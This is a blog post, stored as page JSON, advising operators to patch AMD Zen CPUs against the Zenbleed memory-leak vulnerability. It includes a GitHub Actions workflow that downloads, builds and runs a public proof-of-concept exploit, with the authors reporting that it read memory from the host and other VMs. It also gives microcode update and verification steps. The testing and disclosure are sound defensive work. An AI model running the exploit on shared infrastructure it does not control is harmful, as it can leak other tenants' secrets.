{"pageProps":{"post":{"slug":"amd-zenbleed-update-now","fileName":"2023-07-31-amd-zenbleed-update-now.md","contentHtml":"<p>On 24th July 2023, <a href=\"https://www.theregister.com/2023/07/24/amd_zenbleed_bug/\">The Register covered a new exploit</a> for certain AMD CPUs based upon the Zen architecture. The exploit, dubbed Zenbleed, allows an attacker to read arbitrary physical memory locations on the host system. It works by allowing memory to be read after it's been set to be freed up aka \"use-after-free\". This is a serious vulnerability, and you should update your AMD hosts as soon as possible.</p>\n<p>Even more dangerous was the claim by The Register that any level of VM isolation prevents the exploit from working. This is not true. We tested the exploit with a sample GitHub Action running within Firecracker.</p>\n<blockquote>\n<p>\"If you stick any emulation layer in between, such as Qemu, then the exploit understandably fails.\"</p>\n</blockquote>\n<p>We proved this to be wrong, QEMU &#x26; Firecracker (both use KVM), Docker, etc are all affected in the same way as running a malicious process directly on the host.</p>\n<p>To test this, we ran a GitHub actions matrix build that creates many VMs running different versions of K3s. About the same time, we triggered a build which runs a Zenbleed exploit PoC written by <a href=\"https://twitter.com/taviso\">Tavis Ormandy</a>, a security researcher at Google.</p>\n<p>We found that the exploit was able to read the memory of the host system, and that the exploit was able to read the memory of other VMs running on the same host.</p>\n<pre><code class=\"hljs language-yaml\"><span class=\"hljs-attr\">name:</span> <span class=\"hljs-string\">build</span>\n\n<span class=\"hljs-attr\">on:</span>\n    <span class=\"hljs-attr\">pull_request:</span>\n        <span class=\"hljs-attr\">branches:</span>\n        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">'*'</span>\n    <span class=\"hljs-attr\">push:</span>\n        <span class=\"hljs-attr\">branches:</span>\n        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">master</span>\n        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">main</span>\n    <span class=\"hljs-attr\">workflow_dispatch:</span>\n\n<span class=\"hljs-attr\">jobs:</span>\n    <span class=\"hljs-attr\">build:</span>\n        <span class=\"hljs-attr\">name:</span> <span class=\"hljs-string\">specs</span>\n        <span class=\"hljs-attr\">runs-on:</span> <span class=\"hljs-string\">actuated</span>\n        <span class=\"hljs-attr\">steps:</span>\n        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-attr\">uses:</span> <span class=\"hljs-string\">actions/checkout@v1</span>\n        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-attr\">name:</span> <span class=\"hljs-string\">Download</span> <span class=\"hljs-string\">exploit</span>\n          <span class=\"hljs-attr\">run:</span> <span class=\"hljs-string\">|\n            curl -L -S -s -O https://lock.cmpxchg8b.com/files/zenbleed-v5.tar.gz\n            tar -xvf zenbleed-v5.tar.gz\n            sudo apt install -qy build-essential make nasm\n</span>        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-attr\">name:</span> <span class=\"hljs-string\">Build</span> <span class=\"hljs-string\">exploit</span>\n          <span class=\"hljs-attr\">run:</span> <span class=\"hljs-string\">|\n            cd zenbleed\n            make\n            chmod +x ./zenbleed\n</span>        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-attr\">name:</span> <span class=\"hljs-string\">Run</span> <span class=\"hljs-string\">exploit</span> <span class=\"hljs-string\">for</span> <span class=\"hljs-number\">1000 </span><span class=\"hljs-string\">pieces</span> <span class=\"hljs-string\">of</span> <span class=\"hljs-string\">data</span>\n          <span class=\"hljs-attr\">run:</span> <span class=\"hljs-string\">|\n            ./zenbleed/zenbleed -m 1000\n</span></code></pre>\n<p>Full details of the exploit can be found on a microsite created by the security researcher who discovered the vulnerability. The <code>-m 1000</code> flag reads 1000 pieces of memory and then exits.</p>\n<p><a href=\"https://lock.cmpxchg8b.com/zenbleed.html#vulnerability\">Zenbleed by Tavis Ormandy</a></p>\n<p>We didn't see any secrets printed out during the scan, but we did see part of a public SSH key, console output from etcd running within K3s, and instructions from containerd. So we can assume anything that was within memory within one of the other VMs on the host, or even the host itself, could be read by the exploit.</p>\n<p><img src=\"/images/2023-07-zenbleed/gha.png\" alt=\"GHA output from the zenbleed exploit\"></p>\n<blockquote>\n<p>GHA output from the zenbleed exploit</p>\n</blockquote>\n<h2>Mitigation</h2>\n<p>AMD has already released a mitigation for the Zenbleed exploit, which requires an update to the CPU's microcode.</p>\n<p><a href=\"https://www.linkedin.com/in/edwardvielmetti/\">Ed Vielmetti</a>, Developer Partner Manager at Equinix told us that mitigation is three-fold:</p>\n<ol>\n<li>There is an incoming BIOS update from certain vendors that will update the microcode.</li>\n<li>Updating some OSes like the Ubuntu 20.04 and 22.04 will upgrade the microcode of the CPU.</li>\n<li>There is a <a href=\"https://www.reddit.com/r/linux/comments/15903hr/zenbleed_a_useafterfree_in_amd_zen2_processors/\">\"chicken bit\"</a> that can be enabled which prevents the exploit from working.</li>\n</ol>\n<p>I probably don't need to spell this out, but a system update looks like the following, and the reboot is required:</p>\n<pre><code class=\"hljs language-bash\">sudo apt update -qy &#x26;&#x26; \\\n    sudo apt upgrade -yq &#x26;&#x26; \\\n    sudo reboot \n</code></pre>\n<p><img src=\"/images/2023-07-zenbleed/microcode.png\" alt=\"An update to the CPU microcode is required\"></p>\n<p>For some unknown reason, both of the Equinix AMD hosts that we use internally broke after running the OS upgrade, so I had to reinstall Ubuntu 22.04 using the dashboard. If for whatever reason the machine won't come up after the microcode update, then you should reinstall the Operating System (OS) using your vendor's rescue system or out of band console, both Equinix Metal and Hetzner have an \"easy button\" that you can click for this. If there is still an issue after that, reach out to your vendor's support team.</p>\n<p>New machines provisioned after this date should already contain the microcode fix or have the \"chicken bit\" enabled. We provisioned a new AMD Epyc server on Equinix Metal to make sure, and as expected, thanks to their hard work - it was not vulnerable.</p>\n<p>We offer 500 USD of free credit for new Equinix Metal customers to use with actuated, and Equinix Metal have also written up their own guide on workaround here:</p>\n<ul>\n<li><a href=\"https://deploy.equinix.com/blog/an-update-on-the-amd-zen-2-cpu-vulnerability/\">An Update On the AMD Zen 2 CPU Vulnerability</a></li>\n</ul>\n<h2>Verifying the mitigation</h2>\n<p>Since actuated VMs use Firecracker, you should run the above workflow before and after to verify the exploit was a) present and b) mitigated.</p>\n<p><img src=\"/images/2023-07-zenbleed/mitigated.png\" alt=\"What it looks like when the mitigation is in place\"></p>\n<blockquote>\n<p>Above: What it looks like when the mitigation is in place</p>\n</blockquote>\n<p>You can also run the exploit on the host by copying and pasting the commands from the GitHub Action above.</p>\n<p>My workstation uses a Ryzen 9 CPU, so when I ran the exploit I just saw a blocking message instead of memory regions:</p>\n<pre><code class=\"hljs language-bash\">$ grep <span class=\"hljs-string\">\"model name\"</span> /proc/cpuinfo |<span class=\"hljs-built_in\">uniq</span>\nmodel name\t: AMD Ryzen 9 5950X 16-Core Processor\n\n./zenbleed -m 100\n*** EMBARGOED SECURITY ISSUE --  DO NOT DISTRIBUTE! ***\nZenBleed Testcase -- taviso@google.com\n\nNOTE: Try -h to see configuration options\n\nSpawning 32 Threads...\nThread 0x7fd0d40e8700 running on CPU 0\nThread 0x7fd0d38e7700 running on CPU 1\n...\n</code></pre>\n<p>You can also run the following command to print out the microcode version. This is the output from the Equinix Metal server (c3.medium) that ran an OS update on:</p>\n<pre><code class=\"hljs language-bash\">$ grep <span class=\"hljs-string\">'microcode'</span> /proc/cpuinfo\nmicrocode\t: 0x830107a\n</code></pre>\n<h2>Wrapping up</h2>\n<p>Actuated uses <a href=\"https://firecracker-microvm.github.io/\">Firecracker</a>, an open source Virtual Machine Manager (VMM) that works with Linux KVM to run isolated systems on a host. We have verified that the exploit works on Firecracker, and that the mitigation works too. So whilst VM-level isolation and an immutable filesystem is much more appropriate than a container for CI, this is an example of why we must still be vigilant and ready to respond to security vulnerabilities.</p>\n<p>This is an unfortunate, and serious vulnerability. It affects bare-metal, VMs and containers, which is why it's important to update your systems as soon as possible.</p>","title":"Update your AMD hosts now to mitigate the Zenbleed exploit","description":"Learn how to update the microcode on your AMD CPU to avoid the Zenbleed exploit.","tags":["images","packer","qemu","kvm"],"author_img":"alex","image":"/images/2023-07-zenbleed/background.png","date":"2023-07-31"}},"__N_SSG":true}